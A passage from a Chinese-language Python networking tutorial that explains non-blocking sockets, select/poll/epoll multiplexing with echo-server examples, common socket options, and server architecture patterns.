class="hljs-keyword">try</span>:<br>    sock.send(<span class="hljs-string">b&#x27;GET / HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n&#x27;</span>)<br><span class="hljs-keyword">except</span> BlockingIOError:<br>    <span class="hljs-comment"># 缓冲区满，暂时无法发送</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># 接收数据</span><br><span class="hljs-keyword">try</span>:<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(data)<br><span class="hljs-keyword">except</span> BlockingIOError:<br>    <span class="hljs-comment"># 没有数据可读</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;暂时没有数据&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>非阻塞的问题</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 需要不断轮询</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        data = sock.recv(<span class="hljs-number">1024</span>)<br>        <span class="hljs-keyword">if</span> data:<br>            process(data)<br>    <span class="hljs-keyword">except</span> BlockingIOError:<br>        <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 继续轮询</span><br><br>    <span class="hljs-comment"># CPU 100%！不断循环检查 ❌</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-IO多路复用"><a href="#2-IO多路复用" class="headerlink" title="2. IO多路复用"></a>2. IO多路复用</h2><h3 id="2-1-什么是IO多路复用？"><a href="#2-1-什么是IO多路复用？" class="headerlink" title="2.1 什么是IO多路复用？"></a>2.1 什么是IO多路复用？</h3><p><strong>IO多路复用（I&#x2F;O Multiplexing）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">问题：<br>如何同时监听多个Socket，而不需要为每个Socket创建线程？<br><br>解决方案：<br>IO多路复用 = 一个线程监听多个Socket<br><br>生活类比：<br>你是一个老师，要照顾30个学生：<br><br>方案1：阻塞（不现实）<br><span class="hljs-bullet">- </span>盯着第1个学生，直到他提问<br><span class="hljs-bullet">- </span>其他29个学生被忽略<br><br>方案2：轮询（CPU浪费）<br><span class="hljs-bullet">- </span>不停地问每个学生：&quot;有问题吗？&quot;<br><span class="hljs-bullet">- </span>大部分时间都在问，很累<br><br>方案3：IO多路复用（最优）<br><span class="hljs-bullet">- </span>坐在讲台上<br><span class="hljs-bullet">- </span>谁举手（有数据），就处理谁<br><span class="hljs-bullet">- </span>没人举手，就休息（阻塞在select上）<br></code></pre></td></tr></table></figure><h3 id="2-2-select"><a href="#2-2-select" class="headerlink" title="2.2 select"></a>2.2 select</h3><p><strong>select原理</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><br><span class="hljs-comment"># 要监听的socket列表</span><br>read_list = [sock1, sock2, sock3]<br>write_list = []<br>error_list = []<br><br><span class="hljs-comment"># 阻塞等待，直到有socket就绪</span><br>readable, writable, exceptional = select.select(<br>    read_list,<br>    write_list,<br>    error_list,<br>    timeout  <span class="hljs-comment"># 超时时间，None表示一直阻塞</span><br>)<br><br><span class="hljs-comment"># 处理就绪的socket</span><br><span class="hljs-keyword">for</span> sock <span class="hljs-keyword">in</span> readable:<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    process(data)<br></code></pre></td></tr></table></figure><p><strong>select服务器示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><span class="hljs-keyword">import</span> socket<br><br>server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>server.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">8888</span>))<br>server.listen(<span class="hljs-number">5</span>)<br>server.setblocking(<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># 要监听的socket列表</span><br>inputs = [server]<br>outputs = []<br><br><span class="hljs-keyword">while</span> inputs:<br>    <span class="hljs-comment"># 等待至少一个socket就绪</span><br>    readable, writable, exceptional = select.select(<br>        inputs, outputs, inputs, <span class="hljs-number">1.0</span><br>    )<br><br>    <span class="hljs-comment"># 处理可读的socket</span><br>    <span class="hljs-keyword">for</span> sock <span class="hljs-keyword">in</span> readable:<br>        <span class="hljs-keyword">if</span> sock <span class="hljs-keyword">is</span> server:<br>            <span class="hljs-comment"># 服务器socket就绪：有新连接</span><br>            client, addr = sock.accept()<br>            client.setblocking(<span class="hljs-literal">False</span>)<br>            inputs.append(client)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;新连接: <span class="hljs-subst">&#123;addr&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 客户端socket就绪：有数据</span><br>            data = sock.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> data:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;收到数据: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>                <span class="hljs-comment"># 发送响应</span><br>                sock.send(data)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 客户端断开</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;客户端断开&quot;</span>)<br>                inputs.remove(sock)<br>                sock.close()<br></code></pre></td></tr></table></figure><p><strong>select的限制</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 监听数量限制<br><span class="hljs-bullet">   -</span> Linux默认：1024个socket<br><span class="hljs-bullet">   -</span> 由FD<span class="hljs-emphasis">_SETSIZE定义</span><br><span class="hljs-emphasis">   - 无法修改（编译时确定）</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">2. 性能问题</span><br><span class="hljs-emphasis">   - 每次调用select都要把fd_</span>set从用户空间拷贝到内核<br><span class="hljs-bullet">   -</span> 内核需要遍历所有fd，检查是否就绪<br><span class="hljs-bullet">   -</span> O(n)复杂度<br><br><span class="hljs-bullet">3.</span> 不支持边缘触发<br><span class="hljs-bullet">   -</span> 只支持水平触发（Level Trigger）<br><br><span class="hljs-bullet">4.</span> 返回后需要遍历<br><span class="hljs-bullet">   -</span> select只告诉你&quot;有socket就绪&quot;<br><span class="hljs-bullet">   -</span> 不告诉你&quot;哪些socket就绪&quot;<br><span class="hljs-bullet">   -</span> 需要自己遍历所有socket检查<br></code></pre></td></tr></table></figure><h3 id="2-3-poll"><a href="#2-3-poll" class="headerlink" title="2.3 poll"></a>2.3 poll</h3><p><strong>poll改进</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><br><span class="hljs-comment"># 创建poll对象</span><br>poll_obj = select.poll()<br><br><span class="hljs-comment"># 注册socket</span><br>poll_obj.register(sock1, select.POLLIN)<br>poll_obj.register(sock2, select.POLLIN | select.POLLOUT)<br><br><span class="hljs-comment"># 等待事件</span><br>events = poll_obj.poll(timeout)<br><br><span class="hljs-comment"># 处理事件</span><br><span class="hljs-keyword">for</span> fd, event <span class="hljs-keyword">in</span> events:<br>    <span class="hljs-keyword">if</span> event &amp; select.POLLIN:<br>        <span class="hljs-comment"># 可读</span><br>        data = sockets[fd].recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">if</span> event &amp; select.POLLOUT:<br>        <span class="hljs-comment"># 可写</span><br>        sockets[fd].send(data)<br></code></pre></td></tr></table></figure><p><strong>poll vs select</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">poll的优点：<br>✅ 没有最大文件描述符限制<br>✅ 使用pollfd结构体数组，不需要每次都拷贝整个集合<br><br>poll的缺点：<br>❌ 仍然是O(n)复杂度<br>❌ 仍需要从用户空间拷贝到内核空间<br>❌ Windows不支持<br><br>共同点：<br><span class="hljs-bullet">- </span>都是水平触发<br><span class="hljs-bullet">- </span>都需要遍历所有fd<br></code></pre></td></tr></table></figure><h3 id="2-4-epoll（Linux专用）"><a href="#2-4-epoll（Linux专用）" class="headerlink" title="2.4 epoll（Linux专用）"></a>2.4 epoll（Linux专用）</h3><p><strong>epoll的优势</strong>：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">epoll</span> <span class="hljs-operator">=</span> 高性能的IO多路复用<br><br>优点：<br>✅ 没有最大文件描述符限制<br>✅ O(<span class="hljs-number">1</span>)复杂度（只返回就绪的fd）<br>✅ 支持边缘触发（Edge Trigger）<br>✅ 使用内存映射（mmap），减少拷贝<br><br>epoll是Linux下高性能网络编程的首选！<br></code></pre></td></tr></table></figure><p><strong>epoll使用</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><br><span class="hljs-comment"># 创建epoll对象</span><br>epoll = select.epoll()<br><br><span class="hljs-comment"># 注册socket</span><br>epoll.register(sock.fileno(), select.EPOLLIN)<br><br><span class="hljs-comment"># 等待事件</span><br>events = epoll.poll(timeout)<br><br><span class="hljs-comment"># events是已就绪的fd列表（不需要遍历所有fd）</span><br><span class="hljs-keyword">for</span> fd, event <span class="hljs-keyword">in</span> events:<br>    <span class="hljs-keyword">if</span> event &amp; select.EPOLLIN:<br>        <span class="hljs-comment"># 可读</span><br>        data = sockets[fd].recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">if</span> event &amp; select.EPOLLOUT:<br>        <span class="hljs-comment"># 可写</span><br>        sockets[fd].send(data)<br></code></pre></td></tr></table></figure><p><strong>epoll服务器示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><span class="hljs-keyword">import</span> socket<br><br>server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>server.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">8888</span>))<br>server.listen(<span class="hljs-number">5</span>)<br>server.setblocking(<span class="hljs-literal">False</span>)<br><br>epoll = select.epoll()<br>epoll.register(server.fileno(), select.EPOLLIN)<br><br>connections = &#123;&#125;<br>requests = &#123;&#125;<br>responses = &#123;&#125;<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        events = epoll.poll(<span class="hljs-number">1</span>)<br><br>        <span class="hljs-keyword">for</span> fileno, event <span class="hljs-keyword">in</span> events:<br>            <span class="hljs-keyword">if</span> fileno == server.fileno():<br>                <span class="hljs-comment"># 新连接</span><br>                client, addr = server.accept()<br>                client.setblocking(<span class="hljs-literal">False</span>)<br>                epoll.register(client.fileno(), select.EPOLLIN)<br>                connections[client.fileno()] = client<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;新连接: <span class="hljs-subst">&#123;addr&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">elif</span> event &amp; select.EPOLLIN:<br>                <span class="hljs-comment"># 可读</span><br>                data = connections[fileno].recv(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> data:<br>                    requests[fileno] = data<br>                    <span class="hljs-comment"># 修改为等待可写</span><br>                    epoll.modify(fileno, select.EPOLLOUT)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 断开连接</span><br>                    epoll.unregister(fileno)<br>                    connections[fileno].close()<br>                    <span class="hljs-keyword">del</span> connections[fileno]<br><br>            <span class="hljs-keyword">elif</span> event &amp; select.EPOLLOUT:<br>                <span class="hljs-comment"># 可写</span><br>                response = requests[fileno]<br>                connections[fileno].send(response)<br>                <span class="hljs-comment"># 修改为等待可读</span><br>                epoll.modify(fileno, select.EPOLLIN)<br>                <span class="hljs-keyword">del</span> requests[fileno]<br><br><span class="hljs-keyword">finally</span>:<br>    epoll.unregister(server.fileno())<br>    epoll.close()<br>    server.close()<br></code></pre></td></tr></table></figure><p><strong>epoll触发模式</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">水平触发（Level Trigger，LT）：<br><span class="hljs-bullet">- </span>默认模式<br><span class="hljs-bullet">- </span>只要fd就绪，就会一直通知<br><span class="hljs-bullet">- </span>安全但可能有性能损失<br><br>示例：<br>socket缓冲区有100字节数据<br>你只读了50字节<br>下次epoll_wait还会通知你（还有50字节未读）<br><br>边缘触发（Edge Trigger，ET）：<br><span class="hljs-bullet">- </span>高性能模式<br><span class="hljs-bullet">- </span>只在fd状态变化时通知一次<br><span class="hljs-bullet">- </span>必须一次性处理完所有数据<br><br>示例：<br>socket缓冲区有100字节数据<br>你只读了50字节<br>下次epoll_wait不会通知你（直到有新数据到达）<br>必须循环读取直到EAGAIN错误<br><br>选择：<br><span class="hljs-bullet">- </span>LT：简单安全，适合大多数场景<br><span class="hljs-bullet">- </span>ET：高性能，需要小心处理<br></code></pre></td></tr></table></figure><h3 id="2-5-select-poll-epoll对比"><a href="#2-5-select-poll-epoll对比" class="headerlink" title="2.5 select&#x2F;poll&#x2F;epoll对比"></a>2.5 select&#x2F;poll&#x2F;epoll对比</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──────────────┬──────────┬──────────┬──────────┐<br>│   特性       │  <span class="hljs-selector-tag">select</span>  │   poll   │  epoll   │<br>├──────────────┼──────────┼──────────┼──────────┤<br>│ 最大连接数   │   <span class="hljs-number">1024</span>   │   无限制 │  无限制  │<br>│ 复杂度       │   <span class="hljs-built_in">O</span>(n)   │   <span class="hljs-built_in">O</span>(n)   │   <span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)   │<br>│ 跨平台       │    ✅    │  部分✅  │    ❌    │<br>│ 性能         │    低    │    中    │    高    │<br>│ 边缘触发     │    ❌    │    ❌    │    ✅    │<br>│ 适用场景     │ 少量连接 │ 中等连接 │ 大量连接 │<br>└──────────────┴──────────┴──────────┴──────────┘<br><br>推荐使用：<br>- Linux：epoll（最优）<br>- Windows：IOCP（完成端口，不是<span class="hljs-selector-tag">select</span>）<br>- 跨平台：poll（或高级框架如asyncio、Twisted）<br></code></pre></td></tr></table></figure><hr><h2 id="3-Socket选项"><a href="#3-Socket选项" class="headerlink" title="3. Socket选项"></a>3. Socket选项</h2><h3 id="3-1-常用Socket选项"><a href="#3-1-常用Socket选项" class="headerlink" title="3.1 常用Socket选项"></a>3.1 常用Socket选项</h3><p><strong>SO_REUSEADDR</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 允许地址重用</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br><br>作用：<br><span class="hljs-number">1.</span> 允许在TIME_WAIT状态下重新绑定端口<br><span class="hljs-number">2.</span> 多个socket绑定到同一个端口（不同接口）<br><br>场景：<br>服务器重启时，之前的连接可能还在TIME_WAIT状态<br>如果不设置此选项，bind()会失败：<span class="hljs-string">&quot;Address already in use&quot;</span><br><br>推荐：<br>服务器应该总是设置此选项<br></code></pre></td></tr></table></figure><p><strong>SO_REUSEPORT</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 允许端口重用（负载均衡）</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, <span class="hljs-number">1</span>)<br><br>作用：<br>多个进程可以绑定到同一个端口<br>内核会自动负载均衡（分发连接）<br><br>使用场景：<br>多进程服务器，每个进程监听同一端口<br></code></pre></td></tr></table></figure><p><strong>TCP_NODELAY</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 禁用Nagle算法</span><br>sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, <span class="hljs-number">1</span>)<br><br>Nagle算法：<br>- 小数据包会被延迟发送，等待合并<br>- 减少网络包数量<br>- 但增加延迟<br><br>禁用场景：<br>- 交互式应用（SSH、Telnet）<br>- 低延迟要求（游戏、VoIP）<br>- 已经做了应用层缓冲<br><br>保留场景：<br>- 批量数据传输<br>- 对延迟不敏感<br></code></pre></td></tr></table></figure><p><strong>SO_KEEPALIVE</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 启用TCP保活机制</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, <span class="hljs-number">1</span>)<br><br>作用：<br>定期发送探测包，检测连接是否还活着<br><br>参数（Linux）：<br>TCP_KEEPIDLE: 空闲多久后开始探测（默认<span class="hljs-number">2</span>小时）<br>TCP_KEEPINTVL: 探测间隔（默认<span class="hljs-number">75</span>秒）<br>TCP_KEEPCNT: 探测次数（默认<span class="hljs-number">9</span>次）<br><br>示例：<br>sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, <span class="hljs-number">60</span>)<br>sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, <span class="hljs-number">10</span>)<br>sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, <span class="hljs-number">3</span>)<br><span class="hljs-comment"># 60秒后开始探测，每10秒一次，失败3次后关闭连接</span><br></code></pre></td></tr></table></figure><p><strong>SO_RCVBUF &#x2F; SO_SNDBUF</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 设置接收/发送缓冲区大小</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>)  <span class="hljs-comment"># 128KB</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>)<br><br>作用：<br>调整socket缓冲区大小<br><br>场景：<br>- 高带宽网络：增大缓冲区<br>- 低延迟要求：减小缓冲区<br></code></pre></td></tr></table></figure><p><strong>SO_LINGER</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 设置关闭时的行为</span><br><span class="hljs-keyword">import</span> struct<br>linger = struct.pack(<span class="hljs-string">&#x27;ii&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment"># 启用，等待10秒</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)<br><br>参数：<br>l_onoff: <span class="hljs-number">0</span>=禁用, <span class="hljs-number">1</span>=启用<br>l_linger: 等待时间（秒）<br><br>行为：<br>l_onoff=<span class="hljs-number">0</span>: close()立即返回，后台继续发送<br>l_onoff=<span class="hljs-number">1</span>, l_linger&gt;<span class="hljs-number">0</span>: close()等待数据发送完或超时<br>l_onoff=<span class="hljs-number">1</span>, l_linger=<span class="hljs-number">0</span>: close()立即返回，发送RST（丢弃数据）<br><br>使用场景：<br>一般不设置，使用默认行为<br></code></pre></td></tr></table></figure><h3 id="3-2-获取Socket选项"><a href="#3-2-获取Socket选项" class="headerlink" title="3.2 获取Socket选项"></a>3.2 获取Socket选项</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 获取选项值</span><br>value = sock.getsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;SO_REUSEADDR: <span class="hljs-subst">&#123;value&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 获取缓冲区大小</span><br>rcvbuf = sock.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)<br>sndbuf = sock.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;接收缓冲区: <span class="hljs-subst">&#123;rcvbuf&#125;</span> 字节&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;发送缓冲区: <span class="hljs-subst">&#123;sndbuf&#125;</span> 字节&quot;</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="4-高性能服务器设计模式"><a href="#4-高性能服务器设计模式" class="headerlink" title="4. 高性能服务器设计模式"></a>4. 高性能服务器设计模式</h2><h3 id="4-1-常见架构模式"><a href="#4-1-常见架构模式" class="headerlink" title="4.1 常见架构模式"></a>4.1 常见架构模式</h3><p><strong>1. 单线程阻塞（最简单）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    client, addr = server.accept()  <span class="hljs-comment"># 阻塞</span><br>    data = client.recv(<span class="hljs-number">1024</span>)        <span class="hljs-comment"># 阻塞</span><br>    client.send(response)<br>    client.close()<br><br>优点：<br>✅ 代码简单<br><br>缺点：<br>❌ 同一时间只能服务一个客户端<br>❌ 性能极差<br><br>适用：<br>- 学习demo<br>- 极少并发的场景<br></code></pre></td></tr></table></figure><p><strong>2. 多线程（简单但有限制）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 